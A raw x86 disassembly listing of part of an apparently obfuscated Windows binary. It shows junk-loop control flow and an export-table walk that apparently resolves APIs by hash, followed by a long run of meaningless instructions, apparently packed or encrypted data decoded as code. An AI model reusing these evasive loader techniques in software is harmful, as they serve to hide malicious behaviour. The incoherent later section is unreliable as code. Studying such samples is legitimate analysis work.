  405331:	cmp    DWORD PTR ds:0x429024,0x0
  405338:	je     0x405390
  40533e:	cmp    DWORD PTR ds:0x429024,0x6
  405345:	jne    0x40535e
  40534b:	push   0x5506
  405350:	push   0x42b000
  405355:	push   DWORD PTR [ebp-0x28]
  405358:	call   DWORD PTR ds:0x42ed45
  40535e:	cmp    DWORD PTR ds:0x429024,0x7
  405365:	jne    0x405378
  40536b:	mov    ecx,DWORD PTR ds:0x429024
  405371:	dec    ecx
  405372:	mov    DWORD PTR ds:0x429024,ecx
  405378:	mov    ecx,DWORD PTR ds:0x429024
  40537e:	dec    ecx
  40537f:	mov    DWORD PTR ds:0x429024,ecx
  405385:	jmp    0x405331
  40538a:	or     DWORD PTR ds:0x42a004,ebx
  405390:	mov    ecx,DWORD PTR [ebp-0x4]
  405393:	xor    ecx,ebx
  405395:	add    ecx,eax
  405397:	sub    esi,0x6631
  40539d:	mov    DWORD PTR [ebp-0x30],ecx
  4053a0:	dec    esi
  4053a1:	mov    esi,DWORD PTR [ebp-0x4]
  4053a4:	and    DWORD PTR ds:0x42d01c,0x0
  4053ae:	jmp    0x4053c2
  4053b3:	xor    ecx,ecx
  4053b5:	or     ecx,DWORD PTR ds:0x42d01c
  4053bb:	inc    ecx
  4053bc:	mov    DWORD PTR ds:0x42d01c,ecx
  4053c2:	cmp    DWORD PTR ds:0x42d01c,0x1e
  4053c9:	jae    0x405407
  4053cf:	cmp    DWORD PTR ds:0x42d01c,0xe
  4053d6:	jne    0x4053e2
  4053dc:	call   DWORD PTR ds:0x42ed51
  4053e2:	cmp    DWORD PTR ds:0x42d01c,0xd
  4053e9:	jne    0x4053fc
  4053ef:	mov    ecx,DWORD PTR ds:0x42d01c
  4053f5:	inc    ecx
  4053f6:	mov    DWORD PTR ds:0x42d01c,ecx
  4053fc:	jmp    0x4053b3
  405401:	or     ecx,DWORD PTR ds:0x42a000
  405407:	xor    esi,ebx
  405409:	dec    ecx
  40540a:	add    esi,eax
  40540c:	mov    ecx,DWORD PTR [ebp-0x24]
  40540f:	and    DWORD PTR ds:0x429000,0x42c018
  405419:	sub    ecx,eax
  40541b:	or     DWORD PTR ds:0x42b014,0x429024
  405425:	lea    edx,[esi-0x3272dd]
  40542b:	add    DWORD PTR ds:0x42d008,0x42a004
  405435:	xor    ecx,ebx
  405437:	adc    DWORD PTR ds:0x42d018,0x3588
  405441:	xor    edx,ebx
  405443:	cmp    edx,ecx
  405445:	je     0x4056db
  40544b:	mov    ecx,DWORD PTR [ebp-0x4]
  40544e:	or     DWORD PTR ds:0x42a004,0x7d41
  405458:	xor    ecx,ebx
  40545a:	sbb    DWORD PTR ds:0x42c004,0x1a4b
  405464:	add    ecx,eax
  405466:	cmp    esi,ecx
  405468:	mov    DWORD PTR ds:0x429018,0x444d
  405472:	jne    0x4056b8
  405478:	and    DWORD PTR ds:0x42b004,0x273e
  405482:	push   DWORD PTR [ebp+0x8]
  405485:	add    DWORD PTR ds:0x42d01c,0x42c004
  40548f:	call   0x404fa3
  405494:	mov    DWORD PTR [ebp-0x18],eax
  405497:	sub    ecx,ecx
  405499:	mov    eax,DWORD PTR [ebp-0x4]
  40549c:	and    DWORD PTR ds:0x42d010,0x0
  4054a6:	jmp    0x4054b8
  4054ab:	mov    edi,DWORD PTR ds:0x42d010
  4054b1:	inc    edi
  4054b2:	mov    DWORD PTR ds:0x42d010,edi
  4054b8:	cmp    DWORD PTR ds:0x42d010,0x1b
  4054bf:	jae    0x40557c
  4054c5:	cmp    DWORD PTR ds:0x42d010,0x10
  4054cc:	jne    0x4054d8
  4054d2:	call   DWORD PTR ds:0x42ed55
  4054d8:	cmp    DWORD PTR ds:0x42d010,0xf
  4054df:	jne    0x4054f2
  4054e5:	mov    edi,DWORD PTR ds:0x42d010
  4054eb:	inc    edi
  4054ec:	mov    DWORD PTR ds:0x42d010,edi
  4054f2:	jmp    0x4054ab
  4054f7:	mov    DWORD PTR ds:0x42c00c,0x1c
  405501:	cmp    DWORD PTR ds:0x42c00c,0x0
  405508:	je     0x40557c
  40550e:	cmp    DWORD PTR ds:0x42c00c,0x4
  405515:	jne    0x405544
  40551b:	push   0x213d
  405520:	push   0x2583
  405525:	push   0x42d000
  40552a:	push   0x5f61
  40552f:	push   0x589a
  405534:	push   0x1da2
  405539:	push   0x4b46
  40553e:	call   DWORD PTR ds:0x42ed59
  405544:	cmp    DWORD PTR ds:0x42c00c,0x5
  40554b:	jne    0x40555e
  405551:	mov    edi,DWORD PTR ds:0x42c00c
  405557:	dec    edi
  405558:	mov    DWORD PTR ds:0x42c00c,edi
  40555e:	xor    edi,edi
  405560:	add    edi,DWORD PTR ds:0x42c00c
  405566:	dec    edi
  405567:	mov    DWORD PTR ds:0x42c00c,edi
  40556d:	jmp    0x405501
  405572:	adc    DWORD PTR ds:0x42c004,0x62a8
  40557c:	mov    ecx,DWORD PTR [ebp-0x18]
  40557f:	dec    edi
  405580:	xor    eax,ebx
  405582:	sub    edi,0x56bd
  405588:	mov    edi,0x3272dd
  40558d:	mov    DWORD PTR ds:0x42d00c,0x2303
  405597:	add    eax,edi
  405599:	mov    DWORD PTR ds:0x42a00c,0x3ae7
  4055a3:	cmp    ecx,eax
  4055a5:	mov    DWORD PTR ds:0x42d018,0x39c7
  4055af:	je     0x407aa3
  4055b5:	add    DWORD PTR ds:0x42b004,0x7234
  4055bf:	push   DWORD PTR [ebp-0x18]
  4055c2:	push   DWORD PTR [ebp+0x8]
  4055c5:	call   0x40cc1e
  4055ca:	mov    ecx,DWORD PTR ds:0x42b01c
  4055d0:	sub    DWORD PTR ds:0x42a010,ecx
  4055d6:	mov    DWORD PTR [ebp-0x18],eax
  4055d9:	mov    eax,DWORD PTR [ebp-0x4]
  4055dc:	mov    ecx,DWORD PTR [ebp-0x18]
  4055df:	mov    DWORD PTR ds:0x429000,0x7fe2
  4055e9:	xor    eax,ebx
  4055eb:	or     DWORD PTR ds:0x42a01c,0x42c010
  4055f5:	add    eax,edi
  4055f7:	mov    DWORD PTR ds:0x42b010,0x7af8
  405601:	cmp    ecx,eax
  405603:	mov    DWORD PTR ds:0x429014,0x1a63
  40560d:	je     0x407aa3
  405613:	mov    eax,ds:0x411f6c
  405618:	mov    ecx,DWORD PTR ds:0x411f84
  40561e:	sub    eax,ecx
  405620:	sub    eax,DWORD PTR [eax+ecx*1]
  405623:	mov    eax,DWORD PTR [ebp-0x18]
  405626:	mov    eax,DWORD PTR [eax+0x18]
  405629:	mov    DWORD PTR [ebp-0x24],eax
  40562c:	and    DWORD PTR ds:0x429028,edi
  405632:	mov    eax,DWORD PTR [ebp-0x18]
  405635:	and    DWORD PTR ds:0x429014,0x0
  40563f:	xor    ecx,ecx
  405641:	xor    ecx,DWORD PTR ds:0x429014
  405647:	inc    ecx
  405648:	mov    DWORD PTR ds:0x429014,ecx
  40564e:	cmp    DWORD PTR ds:0x429014,0xa
  405655:	jne    0x405669
  40565b:	push   DWORD PTR [ebp-0xc]
  40565e:	push   0x42e0a1
  405663:	call   DWORD PTR ds:0x42ed5d
  405669:	cmp    DWORD PTR ds:0x429014,0x9
  405670:	jne    0x405683
  405676:	mov    ecx,DWORD PTR ds:0x429014
  40567c:	inc    ecx
  40567d:	mov    DWORD PTR ds:0x429014,ecx
  405683:	cmp    DWORD PTR ds:0x429014,0x1c
  40568a:	jb     0x40563f
  405690:	mov    ecx,DWORD PTR [ebp+0x8]
  405693:	add    ecx,DWORD PTR [eax+0x20]
  405696:	mov    DWORD PTR [ebp-0x2c],ecx
  405699:	mov    eax,DWORD PTR [ebp-0x18]
  40569c:	mov    ecx,DWORD PTR [ebp+0x8]
  40569f:	add    ecx,DWORD PTR [eax+0x24]
  4056a2:	mov    DWORD PTR [ebp-0x34],ecx
  4056a5:	mov    eax,DWORD PTR [ebp-0x18]
  4056a8:	mov    ecx,DWORD PTR [ebp+0x8]
  4056ab:	add    ecx,DWORD PTR [eax+0x1c]
  4056ae:	mov    eax,edi
  4056b0:	mov    DWORD PTR [ebp-0x18],ecx
  4056b3:	jmp    0x407a6b
  4056b8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4056bb:	mov    edx,DWORD PTR [ebp+0x8]
  4056be:	add    edx,DWORD PTR [ecx+esi*4]
  4056c1:	mov    DWORD PTR [ebp-0x28],edx
  4056c4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056c7:	mov    edx,DWORD PTR [ebp-0x28]
  4056ca:	xor    ecx,ebx
  4056cc:	add    ecx,eax
  4056ce:	cmp    edx,ecx
  4056d0:	je     0x407a6b
  4056d6:	jmp    0x407a57
  4056db:	mov    ecx,DWORD PTR [ebp-0x4]
  4056de:	mov    edx,DWORD PTR [ebp-0x8]
  4056e1:	xor    ecx,ebx
  4056e3:	add    ecx,eax
  4056e5:	cmp    edx,ecx
  4056e7:	je     0x407aaf
  4056ed:	jmp    0x407a45
  4056f2:	or     al,0xd7
  4056f4:	xchg   ebp,eax
  4056f5:	loop   0x40576c
  4056f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056f8:	emms   
  4056fa:	adc    dl,BYTE PTR ds:0xf89df58a
  405700:	cld    
  405701:	xlat   BYTE PTR ds:[ebx]
  405703:	pop    edi
  405704:	jp     0x405780
  405706:	aaa    
  405707:	pop    edi
  405708:	jp     0x405784
  40570a:	shl    BYTE PTR [ebx+eiz*8],1
  40570d:	outs   dx,DWORD PTR ds:[esi]
  40570e:	stc    
  40570f:	test   BYTE PTR [ecx+ecx*4-0x19dda3a],ch
  405716:	pop    ebx
  405717:	cmc    
  405718:	adc    DWORD PTR [edx+0x5780850c],0x60
  40571f:	cmp    edx,ebp
  405721:	adc    ecx,esi
  405723:	gs adc eax,esi
  405726:	repnz dec esp
  405728:	scas   eax,DWORD PTR es:[edi]
  405729:	mov    bh,0x12
  40572b:	mov    ebx,0xc26ddbbf
  405730:	cvtdq2ps xmm4,XMMWORD PTR [eax-0x39]
  405734:	sti    
  405735:	xor    DWORD PTR [edi-0x3c52c9fa],esp
  40573b:	stos   BYTE PTR es:[edi],al
  40573c:	mov    ds:0x290989b,eax
  405741:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405742:	cmp    ebp,DWORD PTR [ebx-0x1b302258]
  405748:	xchg   BYTE PTR [edx],cl
  40574a:	xchg   ebx,eax
  40574b:	cvtdq2ps xmm0,xmm5
  40574e:	push   eax
  40574f:	retf   0x2e99
  405752:	stos   BYTE PTR es:[edi],al
  405753:	pushf  
  405754:	aam    0xce
  405756:	iret   
  405757:	fcom   DWORD PTR [eax-0x33f5c9fc]
  40575d:	iret   
  40575e:	gs inc esi
  405760:	xor    eax,0x7d3a80cf
  405765:	leave  
  405766:	cwde   
  405767:	nop
  405768:	push   esi
  405769:	jp     0x40575c
  40576b:	iret   
  40576c:	js     0x4057e2
  40576e:	enter  0x172f,0xac
  405772:	cmp    eax,0xb6406a4b
  405777:	sbb    eax,0xfaf1186c
  40577c:	adc    ecx,edi
  40577e:	xlat   BYTE PTR ds:[ebx]
  40577f:	jecxz  0x40576d
  405781:	rol    dl,cl
  405783:	adc    DWORD PTR [edi],ecx
  405785:	adc    BYTE PTR [eax+0x774ca410],al
  40578b:	js     0x4057a2
  40578d:	inc    ebp
  40578e:	inc    eax
  40578f:	lods   eax,DWORD PTR ds:[esi]
  405790:	push   cs
  405791:	loopne 0x405812
  405793:	cmp    edi,esp
  405795:	test   al,0x6b
  405797:	cld    
  405798:	pop    edx
  405799:	dec    ebp
  40579a:	ins    DWORD PTR es:[edi],dx
  40579b:	call   0x9c7a10df
  4057a0:	jmp    0x135b3cfb
  4057a5:	mov    eax,0xaf53120f
  4057aa:	mov    bh,0xf0
  4057ac:	or     edi,DWORD PTR ds:0x6b14453f
  4057b2:	xor    eax,0xefbc6d15
  4057b7:	dec    edi
  4057b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057b9:	mov    edi,ebp
  4057bb:	inc    ebp
  4057bc:	jne    0x40578f
  4057be:	call   0x2ae9:0x3cc861
  4057c5:	scas   eax,DWORD PTR es:[edi]
  4057c6:	push   ecx
  4057c7:	dec    esi
  4057c8:	loop   0x40583a
  4057ca:	mov    ch,0xa6
  4057cc:	int    0x2c
  4057ce:	dec    edx
  4057cf:	adc    BYTE PTR [ecx-0x75ed9811],cl
  4057d5:	jecxz  0x405763
  4057d7:	lea    eax,[edx]
  4057d9:	cmp    eax,0x6422d3e7
  4057de:	xchg   edx,eax
  4057df:	push   edx
  4057e0:	pop    ebx
  4057e1:	inc    ebp
  4057e2:	das    
  4057e3:	push   0xdee01d27
  4057e8:	scas   al,BYTE PTR es:[edi]
  4057e9:	adc    edx,DWORD PTR [ebp-0x7c8d486c]
  4057ef:	rcl    DWORD PTR [ebx+0x386978de],cl
  4057f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057f6:	mov    ebp,0xfedffc62
  4057fb:	test   BYTE PTR cs:[ebp-0x7d7b70],dh
  405802:	gs (bad) 
  405804:	jmp    0x40580e
  405806:	stos   DWORD PTR es:[edi],eax
  405807:	mov    edx,0x1d842a6d
  40580c:	sti    
  40580d:	adc    eax,esi
  40580f:	fnstcw WORD PTR [edi-0x5f]
  405812:	jle    0x4057d6
  405814:	jmp    0xb62fb4
  405819:	and    eax,0xa58db732
  40581e:	add    dh,BYTE PTR [ecx-0x46]
  405821:	lods   al,BYTE PTR ds:[esi]
  405822:	nop    edx
  405825:	xchg   ebp,eax
  405826:	jmp    0x405802
  405828:	xor    BYTE PTR [ebx],ch
  40582a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40582b:	xchg   edx,eax
  40582c:	lds    edx,FWORD PTR [edi+ecx*2]
  40582f:	xchg   edx,eax
  405830:	add    edx,DWORD PTR [ebx-0x21]
  405833:	cmp    BYTE PTR [ecx+0xf1acdc4],dl
  405839:	test   esi,edi
  40583b:	jg     0x40584b
  40583d:	bound  edi,QWORD PTR [ecx-0x7aafb1b0]
  405843:	leave  
  405844:	stc    
  405845:	(bad)  
  405846:	mov    ecx,0x7f942519
  40584b:	jmp    0x965b1c38
  405850:	mov    dl,0xca
  405852:	push   ss
  405853:	pop    edx
  405854:	xchg   ecx,eax
  405855:	cmp    BYTE PTR [eax+0x70d6325c],ch
  40585b:	mov    edi,0x6b337924
  405860:	sar    edi,cl
  405862:	push   es
  405863:	nop
  405864:	mov    edi,0x4c1fb4f6
  405869:	rcr    BYTE PTR [ecx+0x53],1
  40586c:	fdiv   st(1),st
  40586e:	fist   WORD PTR [ecx+eax*8-0x7ec4e60a]
  405875:	push   edi
  405876:	lahf   
  405877:	and    DWORD PTR [edi+0x74fef559],ecx
  40587d:	xor    ecx,DWORD PTR [eax+0x378cdbf4]
  405883:	lds    esi,FWORD PTR [ebx-0x12]
  405886:	jp     0x4058c0
  405888:	jge    0x4058c1
  40588a:	sar    ch,0xc5
  40588d:	push   cs
  40588e:	sub    al,0xca
  405890:	adc    esi,esi
  405892:	aad    0xa3
  405894:	lds    edx,FWORD PTR [ecx]
  405896:	xor    BYTE PTR [edi],0x6f
  405899:	xor    al,dl
  40589b:	cmc    
  40589c:	add    eax,0x5646f4ea
  4058a1:	jle    0x40587b
  4058a3:	pop    ebx
  4058a4:	aam    0x62
  4058a6:	jg     0x4058e8
  4058a8:	repnz test BYTE PTR [edi-0x6f],cl
  4058ac:	push   cs
  4058ad:	jno    0x4058f9
  4058af:	jb     0x4058dd
  4058b1:	pop    ss
  4058b2:	lahf   
  4058b3:	pop    ebx
  4058b4:	mov    ds:0x2e1ad52f,al
  4058b9:	xchg   esi,eax
  4058ba:	cli    
  4058bb:	adc    ebx,DWORD PTR [ebp+0x418797a9]
  4058c1:	cmp    bh,BYTE PTR [edi]
  4058c3:	push   cs
  4058c4:	push   ss
  4058c5:	xchg   edi,eax
  4058c6:	out    0xba,al
  4058c8:	ds ins DWORD PTR es:[edi],dx
  4058ca:	inc    esp
  4058cb:	jnp    0x40588a
  4058cd:	mov    bl,0xc4
  4058cf:	iret   
  4058d0:	mov    bh,0x7f
  4058d2:	test   eax,0xe6c25854
  4058d7:	dec    eax
  4058d8:	push   cs
  4058d9:	iret   
  4058da:	mov    bl,0xfe
  4058dc:	int    0xbc
  4058de:	mov    eax,0x7084196
  4058e3:	fldenv [edx]
  4058e5:	in     eax,0xd7
  4058e7:	lods   eax,DWORD PTR ds:[esi]
  4058e8:	aad    0xb3
  4058ea:	sar    DWORD PTR [ebx],0x1e
  4058ed:	addr16 push ds
  4058ef:	pop    ecx
  4058f0:	jae    0x4058b5
  4058f2:	sub    BYTE PTR [eax+0xdf456e0],dl
  4058f8:	ror    esi,cl
  4058fa:	outs   dx,BYTE PTR ds:[esi]
  4058fb:	lahf   
  4058fc:	(bad)  
  4058fd:	out    dx,al
  4058fe:	jmp    0xb3f0dbd
  405903:	ds push edx
  405905:	jg     0x405978
  405907:	pop    edx
  405908:	dec    ecx
  405909:	pop    ds
  40590a:	inc    edi
  40590b:	jb     0x4058cf
  40590d:	sub    BYTE PTR [esi],0x1b
  405910:	push   ds
  405911:	xor    al,0x29
  405913:	aaa    
  405914:	sub    BYTE PTR [eax+0x406256bc],dh
  40591a:	lods   eax,DWORD PTR ds:[esi]
  40591b:	sub    edi,esp
  40591d:	sbb    eax,0x4e4d5f1b
  405922:	int3   
  405923:	dec    ebx
  405924:	in     eax,dx
  405925:	xor    al,0xa2
  405927:	dec    eax
  405928:	pushf  
  405929:	mov    esi,0xc6766756
  40592e:	rcr    DWORD PTR [ebx-0x16],0x9b
  405932:	xlat   BYTE PTR ds:[ebx]
  405933:	clc    
  405934:	xchg   ecx,eax
  405935:	fild   WORD PTR [esi-0x3]
  405938:	inc    eax
  405939:	lods   eax,DWORD PTR ds:[esi]
  40593a:	xlat   BYTE PTR ds:[ebx]
  40593b:	mov    ch,0x54
  40593d:	pminsw mm7,QWORD PTR [edx-0x57b4bdc1]
  405944:	add    al,0x7b
  405946:	(bad)  
  405947:	int3   
  405948:	pop    ds
  405949:	mov    cs,WORD PTR [edx]
  40594b:	mov    bl,0x55
  40594d:	arpl   WORD PTR [ebp-0x692f23c4],di
  405953:	push   eax
  405954:	test   al,0xe
  405956:	ins    DWORD PTR es:[edi],dx
  405957:	pop    ecx
  405958:	ret    
  405959:	adc    ch,bl
  40595b:	scas   eax,DWORD PTR es:[edi]
  40595c:	mov    DWORD PTR [ecx+0x3d6f3e63],eax
  405962:	aaa    
  405963:	xchg   ebx,eax
  405964:	daa    
  405965:	adc    DWORD PTR [edi],esp
  405967:	sar    BYTE PTR [edx],0x1e
  40596a:	jg     0x40591f
  40596c:	(bad)  
  40596e:	fadd   DWORD PTR [edi]
  405970:	or     dl,bl
  405972:	inc    ecx
  405973:	or     eax,0xc29378f2
  405978:	pop    ebp
  405979:	into   
  40597a:	mov    dh,0x94
  40597c:	sbb    ebx,DWORD PTR [eax]
  40597e:	scas   al,BYTE PTR es:[edi]
  40597f:	scas   eax,DWORD PTR es:[edi]
  405980:	test   BYTE PTR [si-0x7d],ch
  405984:	out    dx,al
  405985:	cmp    esp,DWORD PTR [ecx+edx*8+0x7d]
  405989:	in     al,0x76
  40598b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40598c:	push   eax
  40598d:	pop    esp
  40598e:	dec    DWORD PTR [ebx+0x7a7d18ae]
  405994:	icebp  
  405995:	add    cl,BYTE PTR [ecx-0xc]
  405998:	jmp    0x8582d9a4
  40599d:	add    dh,BYTE PTR [edi-0x3b]
  4059a0:	loope  0x4059c0
  4059a2:	jns    0x40594d
  4059a4:	jp     0x4059dc
  4059a6:	aad    0x35
  4059a8:	iret   
  4059a9:	(bad)  
  4059aa:	xchg   edx,eax
  4059ab:	add    DWORD PTR [eax],eax
  4059ad:	hlt    
  4059ae:	cmp    dl,BYTE PTR gs:[eax]
  4059b1:	xchg   ebp,eax
  4059b2:	sti    
  4059b3:	sahf   
  4059b4:	cwde   
  4059b5:	call   0x3e12:0x9454e417
  4059bc:	call   0xc5e1:0x503b1ead
  4059c3:	lds    esi,FWORD PTR [ebp+0x78]
  4059c6:	pop    ebx
  4059c7:	jbe    0x4059b6
  4059c9:	inc    edx
  4059ca:	je     0x405985
  4059cc:	jmp    0xf824:0x5164a0d8
  4059d3:	mov    eax,0x23ea9cdb
  4059d8:	fwait
  4059d9:	outs   dx,BYTE PTR ds:[esi]
  4059da:	stos   BYTE PTR es:[edi],al
  4059db:	bound  edx,QWORD PTR [edi]
  4059dd:	je     0x405963
  4059df:	and    BYTE PTR [ebx+0x38801261],bl
  4059e5:	dec    eax
  4059e6:	mov    ebx,DWORD PTR [ebx+edx*8+0x55e9a00a]
  4059ed:	sub    DWORD PTR [edx+0x51],edi
  4059f0:	push   0x20
  4059f2:	imul   ecx,DWORD PTR [edx+0x364abc42],0x50b3a20c
  4059fc:	call   0xb27b8f5
  405a01:	add    ecx,esi
  405a03:	add    dl,al
  405a05:	ret    
  405a06:	sub    al,0x2c
  405a08:	sub    dh,BYTE PTR [edi+0x44]
  405a0b:	jmp    0x946c:0x3f79503b
  405a12:	mov    dh,0x1e
  405a15:	dec    eax
  405a16:	dec    edi
  405a17:	jno    0x4059f2
  405a19:	mov    dh,0xde
  405a1b:	iret   
  405a1c:	out    0x5e,eax
  405a1e:	and    DWORD PTR [esi],0xd3f613c
  405a24:	pop    eax
  405a25:	mov    esp,0xacfc1c33
  405a2a:	lods   eax,DWORD PTR ds:[esi]
  405a2b:	lahf   
  405a2c:	shl    BYTE PTR [edx+eax*8-0x1ea56962],1
  405a33:	scas   eax,DWORD PTR es:[edi]
  405a34:	fwait
  405a35:	push   ss
  405a36:	and    eax,0x9c785597
  405a3b:	fsincos 
  405a3d:	mov    DWORD PTR [edi-0x5b],esp
  405a40:	mov    ebx,0xd7c7ec90
  405a45:	call   ebx
  405a47:	sub    al,0x72
  405a49:	rol    BYTE PTR [edx],cl
  405a4b:	fdivr  st,st(1)
  405a4d:	mov    WORD PTR [esi+0x7e],?
  405a50:	mov    edx,0x65f8d9c8
  405a55:	inc    ebp
  405a56:	fdiv   QWORD PTR [esp+edi*1+0x6dcd3944]
  405a5d:	clc    
  405a5e:	lods   al,BYTE PTR ds:[esi]
  405a5f:	ins    DWORD PTR es:[edi],dx
  405a60:	dec    esp
  405a61:	(bad)  [edi-0x3d]
  405a64:	mov    edx,0xed5df8ab
  405a69:	mov    ch,0x19
  405a6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a6c:	and    ebp,DWORD PTR [esi+eiz*2+0x7]
  405a70:	dec    ebx
  405a71:	call   0xc23374c2
  405a76:	and    eax,0x293d10d8
  405a7b:	and    DWORD PTR [edi-0x7cad0f8b],esp
  405a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a82:	xchg   ecx,eax
  405a83:	into   
  405a84:	jge    0x405a20
  405a86:	test   eax,0x9a761b9c
  405a8b:	mov    bl,0x41
  405a8d:	jnp    0x405a20
  405a8f:	xchg   ebx,eax
  405a90:	dec    eax
  405a91:	sub    bh,cl
  405a93:	cmp    al,0x96
  405a95:	retf   0xb396
  405a98:	mov    bl,0xe8
  405a9a:	xor    cl,BYTE PTR [esi]
  405a9c:	test   ebp,edx
  405a9e:	scas   eax,DWORD PTR es:[edi]
  405a9f:	retf   0x3331
  405aa2:	hlt    
  405aa3:	iret   
  405aa4:	jmp    0x405ac2
  405aa6:	pop    edi
  405aa7:	jmp    0x405afe
  405aa9:	mov    ch,0xd6
  405aab:	or     dh,dl
  405aad:	adc    dh,BYTE PTR [esp+eax*2-0x32c1d9f]
  405ab4:	retf   
  405ab5:	fild   DWORD PTR [ecx]
  405ab7:	sub    BYTE PTR [ebx],bh
  405ab9:	addr16 jae 0x405a94
  405abc:	xor    al,0xdf
  405abe:	xchg   esp,eax
  405abf:	adc    DWORD PTR [ebp+0x4f],ebp
  405ac2:	retf   
  405ac3:	push   cs
  405ac4:	in     eax,0xb0
  405ac6:	and    eax,0x106c5797
  405acb:	sub    DWORD PTR [ebx+0x13],esi
  405ace:	add    bh,cl
  405ad0:	and    eax,0x260b9eb2
  405ad5:	mov    DWORD PTR [ebx],edx
  405ad7:	or     al,0x2d
  405ad9:	inc    ecx
  405ada:	mov    ebx,0xfcf0d9ac
  405adf:	and    BYTE PTR [ebp-0x5d],ch
  405ae2:	les    edx,FWORD PTR ds:[edi-0x2d299027]
  405ae9:	lea    esp,[ebp-0x2a]
  405aec:	push   ebx
  405aed:	mov    ecx,0x33aef81
  405af2:	push   ecx
  405af3:	dec    edx
  405af4:	lods   eax,DWORD PTR ds:[esi]
  405af5:	std    
  405af6:	add    al,0x11
  405af8:	xchg   esi,eax
  405af9:	inc    esp
  405afa:	fiadd  DWORD PTR [ebp+0x5f]
  405afd:	jbe    0x405aaa
  405aff:	xchg   esp,eax
  405b00:	mov    edi,0x6196254a
  405b05:	out    0x4b,al
  405b07:	dec    eax
  405b08:	jbe    0x405aad
  405b0a:	jge    0x405b07
  405b0c:	mov    bh,0x1d
  405b0e:	mov    ds:0x54b5a699,eax
  405b13:	and    BYTE PTR [esi-0x60],al
  405b16:	aas    
  405b17:	ret    
  405b18:	xor    bh,BYTE PTR [ebx-0x57]
  405b1b:	jo     0x405ada
  405b1d:	popf   
  405b1e:	call   FWORD PTR [edi-0x33231d3d]
  405b24:	daa    
  405b25:	je     0x405b9e
  405b27:	xchg   edi,eax
  405b28:	sub    esi,DWORD PTR fs:[eax]
  405b2b:	or     BYTE PTR [ebx+0x466b390],ch
  405b31:	xor    BYTE PTR [esi+0x42],0x16
  405b35:	or     dl,bh
  405b37:	add    al,dl
  405b39:	aad    0x23
  405b3b:	fcmovnb st,st(1)
  405b3d:	inc    edi
  405b3e:	(bad)  
  405b3f:	mov    edi,0x3e613bf9
  405b44:	int    0x1c
  405b46:	popf   
  405b47:	(bad)  
  405b48:	je     0x405b7c
  405b4a:	loopne 0x405b2e
  405b4c:	test   eax,0x473bd619
  405b51:	enter  0x68dc,0x8b
  405b55:	retf   
  405b56:	sub    al,BYTE PTR [eax+0x10e46c31]
  405b5c:	ficom  DWORD PTR [ecx+ecx*2+0x7dcd208d]
  405b63:	imul   ebx,edx,0x28eed870
  405b69:	xchg   esi,eax
  405b6a:	mov    dl,0x1
  405b6c:	call   0x7c01:0xaa1edb4c
  405b73:	fldcw  WORD PTR [edx+0x66]
  405b76:	imul   edx,DWORD PTR [eax],0x679d03e2
  405b7c:	fld    TBYTE PTR [edi]
  405b7e:	imul   esi,ecx,0xffffffbb
  405b81:	dec    ebx
  405b82:	sar    BYTE PTR [ecx+0x1],cl
  405b85:	sbb    esi,DWORD PTR [edx+0x6d320026]
  405b8b:	adc    DWORD PTR [ebx],ebp
  405b8d:	inc    edx
  405b8e:	shl    BYTE PTR ds:0x335433ed,cl
  405b94:	fidivr WORD PTR [edx]
  405b96:	outs   dx,DWORD PTR ds:[esi]
  405b97:	aad    0xa9
  405b99:	pop    esi
  405b9a:	or     DWORD PTR [esp+edi*4-0x14],esp
  405b9e:	enter  0x6b28,0xa1
  405ba2:	pop    eax
  405ba3:	mov    eax,0x68df16ac
  405ba8:	dec    esi
  405ba9:	sbb    DWORD PTR [eax+esi*8+0x76],esp
  405bad:	dec    esi
  405bae:	adc    BYTE PTR ds:0x3d9523ed,bl
  405bb4:	out    0x6c,al
  405bb6:	push   ds
  405bb7:	sub    DWORD PTR ds:[eax],ebx
  405bba:	shr    BYTE PTR [edi-0xaf7881c],cl
  405bc0:	inc    esi
  405bc1:	lods   eax,DWORD PTR ds:[esi]
  405bc2:	fndisi(8087 only) 
  405bc4:	or     BYTE PTR [ecx],bh
  405bc6:	aad    0x31
  405bc8:	adc    eax,0xa0a05944
  405bcd:	mov    esi,0x8f3d8649
  405bd2:	in     al,0xb5
  405bd4:	mov    bl,0x78
  405bd6:	inc    edx
  405bd7:	ss and eax,0x9e196085
  405bdd:	imul   edx,DWORD PTR [eax-0x382468d0],0xffffff98
  405be4:	ins    DWORD PTR es:[edi],dx
  405be5:	call   0x1d7a:0x8cd1071a
  405bec:	lea    ecx,[ecx-0x6f]
  405bef:	cld    
  405bf0:	or     BYTE PTR [eax],al
  405bf2:	sbb    DWORD PTR [eax],0xdac8ba5c
  405bf8:	test   BYTE PTR [eax-0x7d],cl
  405bfb:	aad    0x92
  405bfd:	in     al,0xfc
  405bff:	dec    edi
  405c00:	sbb    al,0xb2
  405c02:	(bad)  
  405c03:	sub    ah,BYTE PTR [ebx-0x5]
  405c06:	jle    0x405c72
  405c08:	push   esi
  405c09:	push   ss
  405c0a:	xchg   DWORD PTR [ecx],edi
  405c0c:	mov    ebp,0xa4ca142e
  405c11:	dec    ebp
  405c12:	mov    eax,ds:0x7bab74d5
  405c17:	ja     0x405c5d
  405c19:	add    DWORD PTR [edx-0x7bbd62a2],esp
  405c1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405c20:	retf   0x2343
  405c23:	mov    eax,0x1b44d5b0
  405c28:	inc    edx
  405c29:	adc    esp,ecx
  405c2b:	test   edx,edi
  405c2d:	mov    al,0xf4
  405c2f:	enter  0xa6c0,0x6
  405c33:	inc    esi
  405c34:	loopne 0x405bf8
  405c36:	or     ecx,edx
  405c38:	push   ebp
  405c39:	or     BYTE PTR gs:[ebx+0x45cde3],dh
  405c40:	mov    edx,0xfa86352d
  405c45:	or     eax,0xfaca6621
  405c4a:	mov    esi,0x4957b676
  405c4f:	and    eax,0xc9499867
  405c54:	jae    0x405c1d
  405c56:	fst    QWORD PTR [eax+edi*1-0x53]
  405c5a:	call   0x2e7c:0xe41a3d2d
  405c61:	cmp    BYTE PTR [edi+0x6f],cl
